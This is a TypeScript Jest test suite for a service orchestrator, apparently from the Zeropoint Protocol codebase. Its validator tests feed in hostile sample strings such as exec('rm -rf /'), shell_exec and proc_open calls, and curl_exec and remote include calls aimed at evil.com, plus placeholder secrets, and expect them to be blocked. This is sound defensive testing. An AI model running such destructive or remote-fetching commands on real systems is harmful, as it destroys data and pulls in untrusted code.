// © 2025 Zeropoint Protocol, Inc., a Texas C Corporation with principal offices in Austin, TX. All Rights Reserved. View-Only License: No clone, modify, run or distribute without signed agreement. See LICENSE.md and legal@zeropointprotocol.ai.

// src/agents/orchestration/service-orchestrator.spec.ts

import { Test, TestingModule } from "@nestjs/testing";
import { ConfigService } from "@nestjs/config";
import {
  ServiceOrchestrator,
  OrchestrationRequest,
  OperationRequest,
} from "./service-orchestrator.js";
import { EnhancedPetalsService } from "../train/enhanced-petals.service.js";
import { soulchain } from "../soulchain/soulchain.ledger.js";
import { checkIntent } from "../../guards/synthient.guard.js";
import { TagBundle } from "../../core/identity/tags.meta.js";

// Mock dependencies
jest.mock("../soulchain/soulchain.ledger.js");
jest.mock("../../guards/synthient.guard.js");

const mockSoulchain = soulchain as jest.Mocked<typeof soulchain>;
const mockCheckIntent = checkIntent as jest.MockedFunction<typeof checkIntent>;

describe("ServiceOrchestrator", () => {
  let orchestrator: ServiceOrchestrator;
  let _configService: ConfigService;
  let _petalsService: EnhancedPetalsService;

  const mockConfigService = {
    get: jest.fn(),
  };

  const mockPetalsService = {
    callPetalsAPI: jest.fn(),
  };

  const sampleTags: TagBundle = [
    {
      type: "#who",
      name: "test-agent",
      did: "did:zeropoint:test-agent",
      handle: "@test-agent",
    },
    {
      type: "#intent",
      purpose: "#orchestration",
      validation: "good-heart",
    },
    {
      type: "#thread",
      taskId: "test-orchestration",
      lineage: ["test", "orchestration"],
      swarmLink: "orchestration-swarm",
    },
    {
      type: "#layer",
      level: "#live",
    },
    {
      type: "#domain",
      field: "#orchestration",
    },
  ];

  const sampleOperation: OperationRequest = {
    type: "petals",
    data: {
      agentId: "test-agent",
      code: 'function test() { return "hello"; }',
    },
    tags: sampleTags,
  };

  const sampleOrchestrationRequest: OrchestrationRequest = {
    id: "test-orchestration-id",
    agentId: "test-agent",
    operations: [sampleOperation],
    priority: "medium",
  };

  beforeEach(async () => {
    const module: TestingModule = await Test.createTestingModule({
      providers: [
        ServiceOrchestrator,
        {
          provide: ConfigService,
          useValue: mockConfigService,
        },
        {
          provide: EnhancedPetalsService,
          useValue: mockPetalsService,
        },
      ],
    }).compile();

    orchestrator = module.get<ServiceOrchestrator>(ServiceOrchestrator);
    _configService = module.get<ConfigService>(ConfigService);
    _petalsService = module.get<EnhancedPetalsService>(EnhancedPetalsService);

    // Setup default config values
    mockConfigService.get.mockImplementation((key: string) => {
      const config = {
        NODE_ENV: "test",
      };
      return config[key];
    });

    // Reset mocks
    jest.clearAllMocks();
    mockCheckIntent.mockReturnValue(true);
    mockSoulchain.addXPTransaction.mockResolvedValue(undefined);
    mockPetalsService.callPetalsAPI.mockResolvedValue({
      rewrittenCode: 'function test() { return "hello world"; }',
      trustScore: 0.9,
      ethicalRating: "aligned",
    });
  });

  describe("constructor", () => {
    it("should initialize service health tracking", () => {
      expect(orchestrator).toBeDefined();
      const health = orchestrator.getServiceHealth();
      expect(health).toHaveLength(4);
      expect(health.map((h) => h.service)).toEqual([
        "petals",
        "ai-generation",
        "validation",
        "analysis",
      ]);
      expect(health.every((h) => h.status === "healthy")).toBe(true);
    });
  });

  describe("orchestrateServices", () => {
    it("should successfully orchestrate services with valid request", async () => {
      const result = await orchestrator.orchestrateServices(
        sampleOrchestrationRequest,
      );

      expect(result).toBeDefined();
      expect(result.id).toBe("test-orchestration-id");
      expect(result.agentId).toBe("test-agent");
      expect(result.results).toHaveLength(1);
      expect(result.results[0].success).toBe(true);
      expect(result.results[0].type).toBe("petals");
      expect(result.summary.totalOperations).toBe(1);
      expect(result.summary.successfulOperations).toBe(1);
      expect(result.summary.failedOperations).toBe(0);
      expect(result.summary.averageTrustScore).toBeGreaterThan(0);
      expect(result.summary.processingTime).toBeGreaterThan(0);
      expect(result.metadata.orchestrationVersion).toBe("2.0.0");
    });

    it("should throw error when Zeroth-gate validation fails", async () => {
      mockCheckIntent.mockReturnValue(false);

      await expect(
        orchestrator.orchestrateServices(sampleOrchestrationRequest),
      ).rejects.toThrow(
        "Zeroth violation: Orchestration request blocked by validation.",
      );
    });

    it("should throw error when operation validation fails", async () => {
      const invalidOperation = {
        ...sampleOperation,
        data: { agentId: "test-agent", code: 'eval("malicious");' },
      };
      const invalidRequest = {
        ...sampleOrchestrationRequest,
        operations: [invalidOperation],
      };

      await expect(
        orchestrator.orchestrateServices(invalidRequest),
      ).rejects.toThrow(
        "Zeroth violation: Orchestration request blocked by validation.",
      );
    });

    it("should handle orchestration with multiple operations", async () => {
      const multiOperationRequest: OrchestrationRequest = {
        ...sampleOrchestrationRequest,
        operations: [
          sampleOperation,
          {
            type: "ai-generation" as const,
            data: { prompt: "Generate text", maxTokens: 100 },
            tags: sampleTags,
          },
          {
            type: "validation" as const,
            data: { data: "test data", rules: ["rule1"] },
            tags: sampleTags,
          },
        ],
      };

      const result = await orchestrator.orchestrateServices(
        multiOperationRequest,
      );

      expect(result.results).toHaveLength(3);
      expect(result.summary.totalOperations).toBe(3);
      expect(result.summary.successfulOperations).toBe(3);
    });

    it("should handle orchestration with dependencies", async () => {
      const dependentOperations: OperationRequest[] = [
        {
          ...sampleOperation,
          dependencies: [],
        },
        {
          type: "validation" as const,
          data: { data: "test data", rules: ["rule1"] },
          tags: sampleTags,
          dependencies: ["0"], // Depends on first operation
        },
      ];
      const dependentRequest: OrchestrationRequest = {
        ...sampleOrchestrationRequest,
        operations: dependentOperations,
      };

      const result = await orchestrator.orchestrateServices(dependentRequest);

      expect(result.results).toHaveLength(2);
      expect(result.summary.successfulOperations).toBe(2);
    });

    it("should log successful orchestration to Soulchain", async () => {
      await orchestrator.orchestrateServices(sampleOrchestrationRequest);

      expect(mockSoulchain.addXPTransaction).toHaveBeenCalledWith({
        agentId: "test-agent",
        amount: 3, // 1 successful operation * 3
        rationale: expect.stringContaining(
          "Orchestration successful: 1/1 operations",
        ),
        timestamp: expect.any(String),
        previousCid: null,
        tags: expect.arrayContaining([
          expect.objectContaining({
            type: "#intent",
            purpose: "#service-orchestration",
          }),
          expect.objectContaining({
            type: "#thread",
            taskId: "test-orchestration-id",
          }),
        ]),
      });
    });

    it("should log orchestration error to Soulchain when orchestration fails", async () => {
      mockCheckIntent.mockReturnValue(false);

      try {
        await orchestrator.orchestrateServices(sampleOrchestrationRequest);
      } catch (error) {
        // Expected to fail
      }

      expect(mockSoulchain.addXPTransaction).toHaveBeenCalledWith({
        agentId: "test-agent",
        amount: -10,
        rationale: expect.stringContaining("Orchestration failed"),
        timestamp: expect.any(String),
        previousCid: null,
        tags: expect.arrayContaining([
          expect.objectContaining({
            type: "#intent",
            purpose: "#orchestration-error",
          }),
        ]),
      });
    });
  });

  describe("private validation methods", () => {
    describe("validatePetalsOperation", () => {
      it("should return true for valid Petals operation", async () => {
        const result = await (orchestrator as any).validatePetalsOperation(
          sampleOperation,
        );
        expect(result).toBe(true);
      });

      it("should return false for malicious code", async () => {
        const maliciousOperation = {
          ...sampleOperation,
          data: { agentId: "test-agent", code: 'eval("malicious");' },
        };
        const result = await (orchestrator as any).validatePetalsOperation(
          maliciousOperation,
        );
        expect(result).toBe(false);
      });

      it("should return false for resource abuse", async () => {
        const abusiveOperation = {
          ...sampleOperation,
          data: {
            agentId: "test-agent",
            code: "while(true) { /* infinite loop */ }",
          },
        };
        const result = await (orchestrator as any).validatePetalsOperation(
          abusiveOperation,
        );
        expect(result).toBe(false);
      });

      it("should return false for privacy violations", async () => {
        const privacyOperation = {
          ...sampleOperation,
          data: { agentId: "test-agent", code: 'password = "secret123";' },
        };
        const result = await (orchestrator as any).validatePetalsOperation(
          privacyOperation,
        );
        expect(result).toBe(false);
      });
    });

    describe("validateAIGenerationOperation", () => {
      it("should return true for valid AI generation operation", async () => {
        const aiOperation = {
          type: "ai-generation",
          data: { prompt: "Generate text", maxTokens: 1000 },
          tags: sampleTags,
        };
        const result = await (
          orchestrator as any
        ).validateAIGenerationOperation(aiOperation);
        expect(result).toBe(true);
      });

      it("should return false for empty prompt", async () => {
        const aiOperation = {
          type: "ai-generation",
          data: { prompt: "", maxTokens: 1000 },
          tags: sampleTags,
        };
        const result = await (
          orchestrator as any
        ).validateAIGenerationOperation(aiOperation);
        expect(result).toBe(false);
      });

      it("should return false for too long prompt", async () => {
        const aiOperation = {
          type: "ai-generation",
          data: { prompt: "a".repeat(15000), maxTokens: 1000 },
          tags: sampleTags,
        };
        const result = await (
          orchestrator as any
        ).validateAIGenerationOperation(aiOperation);
        expect(result).toBe(false);
      });

      it("should return false for invalid maxTokens", async () => {
        const aiOperation = {
          type: "ai-generation",
          data: { prompt: "Generate text", maxTokens: 0 },
          tags: sampleTags,
        };
        const result = await (
          orchestrator as any
        ).validateAIGenerationOperation(aiOperation);
        expect(result).toBe(false);
      });

      it("should return false for too high maxTokens", async () => {
        const aiOperation = {
          type: "ai-generation",
          data: { prompt: "Generate text", maxTokens: 5000 },
          tags: sampleTags,
        };
        const result = await (
          orchestrator as any
        ).validateAIGenerationOperation(aiOperation);
        expect(result).toBe(false);
      });
    });

    describe("validateValidationOperation", () => {
      it("should return true for valid validation operation", async () => {
        const validationOperation = {
          type: "validation",
          data: { data: "test data", rules: ["rule1", "rule2"] },
          tags: sampleTags,
        };
        const result = await (orchestrator as any).validateValidationOperation(
          validationOperation,
        );
        expect(result).toBe(true);
      });

      it("should return false for empty data", async () => {
        const validationOperation = {
          type: "validation",
          data: { data: "", rules: ["rule1"] },
          tags: sampleTags,
        };
        const result = await (orchestrator as any).validateValidationOperation(
          validationOperation,
        );
        expect(result).toBe(false);
      });

      it("should return false for empty rules", async () => {
        const validationOperation = {
          type: "validation",
          data: { data: "test data", rules: [] },
          tags: sampleTags,
        };
        const result = await (orchestrator as any).validateValidationOperation(
          validationOperation,
        );
        expect(result).toBe(false);
      });
    });

    describe("validateAnalysisOperation", () => {
      it("should return true for valid analysis operation", async () => {
        const analysisOperation = {
          type: "analysis",
          data: { data: "test data", type: "sentiment" },
          tags: sampleTags,
        };
        const result = await (orchestrator as any).validateAnalysisOperation(
          analysisOperation,
        );
        expect(result).toBe(true);
      });

      it("should return false for empty data", async () => {
        const analysisOperation = {
          type: "analysis",
          data: { data: "", type: "sentiment" },
          tags: sampleTags,
        };
        const result = await (orchestrator as any).validateAnalysisOperation(
          analysisOperation,
        );
        expect(result).toBe(false);
      });

      it("should return false for invalid analysis type", async () => {
        const analysisOperation = {
          type: "analysis",
          data: { data: "test data", type: "invalid" },
          tags: sampleTags,
        };
        const result = await (orchestrator as any).validateAnalysisOperation(
          analysisOperation,
        );
        expect(result).toBe(false);
      });

      it("should return true for all valid analysis types", async () => {
        const validTypes = ["sentiment", "entities", "semantic", "syntax"];

        for (const type of validTypes) {
          const analysisOperation = {
            type: "analysis",
            data: { data: "test data", type },
            tags: sampleTags,
          };
          const result = await (orchestrator as any).validateAnalysisOperation(
            analysisOperation,
          );
          expect(result).toBe(true);
        }
      });
    });

    describe("checkForMaliciousPatterns", () => {
      it("should return true for safe code", async () => {
        const safeCode = 'function test() { return "hello"; }';
        const result = await (orchestrator as any).checkForMaliciousPatterns(
          safeCode,
        );
        expect(result).toBe(true);
      });

      it("should return false for eval()", async () => {
        const maliciousCode = 'eval("malicious code");';
        const result = await (orchestrator as any).checkForMaliciousPatterns(
          maliciousCode,
        );
        expect(result).toBe(false);
      });

      it("should return false for exec()", async () => {
        const maliciousCode = 'exec("rm -rf /");';
        const result = await (orchestrator as any).checkForMaliciousPatterns(
          maliciousCode,
        );
        expect(result).toBe(false);
      });

      it("should return false for system()", async () => {
        const maliciousCode = 'system("dangerous command");';
        const result = await (orchestrator as any).checkForMaliciousPatterns(
          maliciousCode,
        );
        expect(result).toBe(false);
      });

      it("should return false for shell_exec()", async () => {
        const maliciousCode = 'shell_exec("rm -rf /");';
        const result = await (orchestrator as any).checkForMaliciousPatterns(
          maliciousCode,
        );
        expect(result).toBe(false);
      });

      it("should return false for passthru()", async () => {
        const maliciousCode = 'passthru("dangerous");';
        const result = await (orchestrator as any).checkForMaliciousPatterns(
          maliciousCode,
        );
        expect(result).toBe(false);
      });

      it("should return false for proc_open()", async () => {
        const maliciousCode = 'proc_open("rm -rf /");';
        const result = await (orchestrator as any).checkForMaliciousPatterns(
          maliciousCode,
        );
        expect(result).toBe(false);
      });

      it("should return false for popen()", async () => {
        const maliciousCode = 'popen("dangerous");';
        const result = await (orchestrator as any).checkForMaliciousPatterns(
          maliciousCode,
        );
        expect(result).toBe(false);
      });

      it("should return false for curl_exec()", async () => {
        const maliciousCode = 'curl_exec("http://evil.com");';
        const result = await (orchestrator as any).checkForMaliciousPatterns(
          maliciousCode,
        );
        expect(result).toBe(false);
      });

      it("should return false for file_get_contents with http", async () => {
        const maliciousCode = 'file_get_contents("http://evil.com");';
        const result = await (orchestrator as any).checkForMaliciousPatterns(
          maliciousCode,
        );
        expect(result).toBe(false);
      });

      it("should return false for include with http", async () => {
        const maliciousCode = 'include("http://evil.com");';
        const result = await (orchestrator as any).checkForMaliciousPatterns(
          maliciousCode,
        );
        expect(result).toBe(false);
      });

      it("should return false for require with http", async () => {
        const maliciousCode = 'require("http://evil.com");';
        const result = await (orchestrator as any).checkForMaliciousPatterns(
          maliciousCode,
        );
        expect(result).toBe(false);
      });
    });

    describe("checkForResourceAbuse", () => {
      it("should return true for safe code", async () => {
        const safeCode = "for (let i = 0; i < 10; i++) { console.log(i); }";
        const result = await (orchestrator as any).checkForResourceAbuse(
          safeCode,
        );
        expect(result).toBe(true);
      });

      it("should return false for infinite while loop", async () => {
        const abusiveCode = "while(true) { /* infinite loop */ }";
        const result = await (orchestrator as any).checkForResourceAbuse(
          abusiveCode,
        );
        expect(result).toBe(false);
      });

      it("should return false for infinite for loop", async () => {
        const abusiveCode = "for(;;) { /* infinite loop */ }";
        const result = await (orchestrator as any).checkForResourceAbuse(
          abusiveCode,
        );
        expect(result).toBe(false);
      });

      it("should return false for set_time_limit(0)", async () => {
        const abusiveCode = "set_time_limit(0);";
        const result = await (orchestrator as any).checkForResourceAbuse(
          abusiveCode,
        );
        expect(result).toBe(false);
      });

      it("should return false for memory_limit = -1", async () => {
        const abusiveCode = 'memory_limit = "-1";';
        const result = await (orchestrator as any).checkForResourceAbuse(
          abusiveCode,
        );
        expect(result).toBe(false);
      });

      it("should return false for max_execution_time = 0", async () => {
        const abusiveCode = 'max_execution_time = "0";';
        const result = await (orchestrator as any).checkForResourceAbuse(
          abusiveCode,
        );
        expect(result).toBe(false);
      });
    });

    describe("checkForPrivacyViolations", () => {
      it("should return true for safe code", async () => {
        const safeCode = 'const name = "John";';
        const result = await (orchestrator as any).checkForPrivacyViolations(
          safeCode,
        );
        expect(result).toBe(true);
      });

      it("should return false for password assignment", async () => {
        const privacyCode = 'password = "secret123";';
        const result = await (orchestrator as any).checkForPrivacyViolations(
          privacyCode,
        );
        expect(result).toBe(false);
      });

      it("should return false for api_key assignment", async () => {
        const privacyCode = 'api_key = "sk-123456";';
        const result = await (orchestrator as any).checkForPrivacyViolations(
          privacyCode,
        );
        expect(result).toBe(false);
      });

      it("should return false for secret assignment", async () => {
        const privacyCode = 'secret = "mysecret";';
        const result = await (orchestrator as any).checkForPrivacyViolations(
          privacyCode,
        );
        expect(result).toBe(false);
      });

      it("should return false for token assignment", async () => {
        const privacyCode = 'token = "jwt-token";';
        const result = await (orchestrator as any).checkForPrivacyViolations(
          privacyCode,
        );
        expect(result).toBe(false);
      });

      it("should return false for private_key assignment", async () => {
        const privacyCode = 'private_key = "-----BEGIN PRIVATE KEY-----";';
        const result = await (orchestrator as any).checkForPrivacyViolations(
          privacyCode,
        );
        expect(result).toBe(false);
      });

      it("should return false for .env reference", async () => {
        const privacyCode = 'load_dotenv(".env");';
        const result = await (orchestrator as any).checkForPrivacyViolations(
          privacyCode,
        );
        expect(result).toBe(false);
      });

      it("should return false for config password", async () => {
        const privacyCode = 'config["password"] = "secret";';
        const result = await (orchestrator as any).checkForPrivacyViolations(
          privacyCode,
        );
        expect(result).toBe(false);
      });
    });
  });

  describe("groupOperationsByDependencies", () => {
    it("should group operations without dependencies correctly", () => {
      const operations = [
        { type: "petals", data: {}, tags: [] },
        { type: "ai-generation", data: {}, tags: [] },
      ];

      const groups = (orchestrator as any).groupOperationsByDependencies(
        operations,
      );
      expect(groups).toHaveLength(1);
      expect(groups[0]).toHaveLength(2);
    });

    it("should group operations with dependencies correctly", () => {
      const operations = [
        { type: "petals", data: {}, tags: [], dependencies: [] },
        { type: "validation", data: {}, tags: [], dependencies: ["0"] },
      ];

      const groups = (orchestrator as any).groupOperationsByDependencies(
        operations,
      );
      expect(groups).toHaveLength(2);
      expect(groups[0]).toHaveLength(1); // First operation
      expect(groups[1]).toHaveLength(1); // Second operation (depends on first)
    });

    it("should handle circular dependencies gracefully", () => {
      const operations = [
        { type: "petals", data: {}, tags: [], dependencies: ["1"] },
        { type: "validation", data: {}, tags: [], dependencies: ["0"] },
      ];

      const groups = (orchestrator as any).groupOperationsByDependencies(
        operations,
      );
      expect(groups).toHaveLength(1);
      expect(groups[0]).toHaveLength(2); // Both operations in same group
    });

    it("should handle complex dependency chains", () => {
      const operations = [
        { type: "petals", data: {}, tags: [], dependencies: [] },
        { type: "validation", data: {}, tags: [], dependencies: ["0"] },
        { type: "analysis", data: {}, tags: [], dependencies: ["1"] },
      ];

      const groups = (orchestrator as any).groupOperationsByDependencies(
        operations,
      );
      expect(groups).toHaveLength(3);
      expect(groups[0]).toHaveLength(1); // First operation
      expect(groups[1]).toHaveLength(1); // Second operation
      expect(groups[2]).toHaveLength(1); // Third operation
    });
  });

  describe("executeSingleOperation", () => {
    it("should execute Petals operation correctly", async () => {
      const result = await (orchestrator as any).executeSingleOperation(
        sampleOperation,
        [],
      );
      expect(result).toBeDefined();
      expect(result.rewrittenCode).toBe(
        'function test() { return "hello world"; }',
      );
      expect(result.trustScore).toBe(0.9);
    });

    it("should execute AI generation operation correctly", async () => {
      const aiOperation = {
        type: "ai-generation",
        data: { prompt: "Generate text", maxTokens: 100 },
        tags: sampleTags,
      };
      const result = await (orchestrator as any).executeSingleOperation(
        aiOperation,
        [],
      );
      expect(result).toBeDefined();
      expect(result.generatedText).toContain(
        "Generated content for: Generate text",
      );
      expect(result.trustScore).toBe(0.85);
    });

    it("should execute validation operation correctly", async () => {
      const validationOperation = {
        type: "validation",
        data: { data: "test data", rules: ["rule1"] },
        tags: sampleTags,
      };
      const result = await (orchestrator as any).executeSingleOperation(
        validationOperation,
        [],
      );
      expect(result).toBeDefined();
      expect(result.isValid).toBe(true);
      expect(result.trustScore).toBe(0.9);
    });

    it("should execute analysis operation correctly", async () => {
      const analysisOperation = {
        type: "analysis",
        data: { data: "test data", type: "sentiment" },
        tags: sampleTags,
      };
      const result = await (orchestrator as any).executeSingleOperation(
        analysisOperation,
        [],
      );
      expect(result).toBeDefined();
      expect(result.analysisType).toBe("sentiment");
      expect(result.trustScore).toBe(0.88);
    });

    it("should throw error for unknown operation type", async () => {
      const unknownOperation = {
        type: "unknown",
        data: {},
        tags: sampleTags,
      };

      await expect(
        (orchestrator as any).executeSingleOperation(unknownOperation, []),
      ).rejects.toThrow("Unknown operation type: unknown");
    });
  });

  describe("calculateOrchestrationSummary", () => {
    it("should calculate correct summary for successful operations", () => {
      const results = [
        { success: true, trustScore: 0.8 },
        { success: true, trustScore: 0.9 },
        { success: true, trustScore: 0.7 },
      ];
      const processingTime = 150;

      const summary = (orchestrator as any).calculateOrchestrationSummary(
        results,
        processingTime,
      );

      expect(summary.totalOperations).toBe(3);
      expect(summary.successfulOperations).toBe(3);
      expect(summary.failedOperations).toBe(0);
      expect(summary.averageTrustScore).toBeCloseTo(0.8, 1);
      expect(summary.processingTime).toBe(150);
    });

    it("should calculate correct summary for mixed results", () => {
      const results = [
        { success: true, trustScore: 0.8 },
        { success: false, trustScore: 0 },
        { success: true, trustScore: 0.9 },
      ];
      const processingTime = 200;

      const summary = (orchestrator as any).calculateOrchestrationSummary(
        results,
        processingTime,
      );

      expect(summary.totalOperations).toBe(3);
      expect(summary.successfulOperations).toBe(2);
      expect(summary.failedOperations).toBe(1);
      expect(summary.averageTrustScore).toBeCloseTo(0.57, 2);
      expect(summary.processingTime).toBe(200);
    });

    it("should handle empty results", () => {
      const results = [];
      const processingTime = 100;

      const summary = (orchestrator as any).calculateOrchestrationSummary(
        results,
        processingTime,
      );

      expect(summary.totalOperations).toBe(0);
      expect(summary.successfulOperations).toBe(0);
      expect(summary.failedOperations).toBe(0);
      expect(summary.averageTrustScore).toBeNaN();
      expect(summary.processingTime).toBe(100);
    });
  });

  describe("logging methods", () => {
    it("should log violation correctly", async () => {
      await (orchestrator as any).logViolation(
        sampleOrchestrationRequest,
        "test reason",
      );

      expect(mockSoulchain.addXPTransaction).toHaveBeenCalledWith({
        agentId: "test-agent",
        amount: -15,
        rationale: "Orchestration violation: test reason",
        timestamp: expect.any(String),
        previousCid: null,
        tags: expect.arrayContaining([
          expect.objectContaining({
            type: "#intent",
            purpose: "#security-violation",
          }),
        ]),
      });
    });

    it("should log successful orchestration correctly", async () => {
      const results = [{ success: true, trustScore: 0.8 }];
      const summary = {
        totalOperations: 1,
        successfulOperations: 1,
        failedOperations: 0,
        averageTrustScore: 0.8,
        processingTime: 100,
      };

      await (orchestrator as any).logSuccessfulOrchestration(
        sampleOrchestrationRequest,
        results,
        summary,
      );

      expect(mockSoulchain.addXPTransaction).toHaveBeenCalledWith({
        agentId: "test-agent",
        amount: 3,
        rationale: expect.stringContaining(
          "Orchestration successful: 1/1 operations",
        ),
        timestamp: expect.any(String),
        previousCid: null,
        tags: expect.arrayContaining([
          expect.objectContaining({
            type: "#intent",
            purpose: "#service-orchestration",
          }),
        ]),
      });
    });

    it("should log orchestration error correctly", async () => {
      const error = new Error("Test error");
      await (orchestrator as any).logOrchestrationError(
        sampleOrchestrationRequest,
        error,
        150,
      );

      expect(mockSoulchain.addXPTransaction).toHaveBeenCalledWith({
        agentId: "test-agent",
        amount: -10,
        rationale: expect.stringContaining("Orchestration failed"),
        timestamp: expect.any(String),
        previousCid: null,
        tags: expect.arrayContaining([
          expect.objectContaining({
            type: "#intent",
            purpose: "#orchestration-error",
          }),
        ]),
      });
    });
  });

  describe("service health management", () => {
    it("should get service health status", () => {
      const health = orchestrator.getServiceHealth();
      expect(health).toHaveLength(4);
      expect(health.every((h) => h.status === "healthy")).toBe(true);
    });

    it("should update service health status", () => {
      const newStatus = {
        service: "petals",
        status: "degraded" as const,
        responseTime: 500,
        lastCheck: new Date().toISOString(),
        errors: ["Timeout error"],
      };

      orchestrator.updateServiceHealth("petals", newStatus);
      const health = orchestrator.getServiceHealth();
      const petalsHealth = health.find((h) => h.service === "petals");

      expect(petalsHealth?.status).toBe("degraded");
      expect(petalsHealth?.responseTime).toBe(500);
      expect(petalsHealth?.errors).toEqual(["Timeout error"]);
    });
  });

  describe("error handling", () => {
    it("should handle operation execution errors gracefully", async () => {
      mockPetalsService.callPetalsAPI.mockRejectedValue(new Error("API Error"));

      const result = await orchestrator.orchestrateServices(
        sampleOrchestrationRequest,
      );

      expect(result.results[0].success).toBe(false);
      expect(result.results[0].error).toBe("API Error");
      expect(result.summary.failedOperations).toBe(1);
    });

    it("should handle validation errors gracefully", async () => {
      mockCheckIntent.mockReturnValue(false);

      await expect(
        orchestrator.orchestrateServices(sampleOrchestrationRequest),
      ).rejects.toThrow(
        "Zeroth violation: Orchestration request blocked by validation.",
      );
    });
  });
});
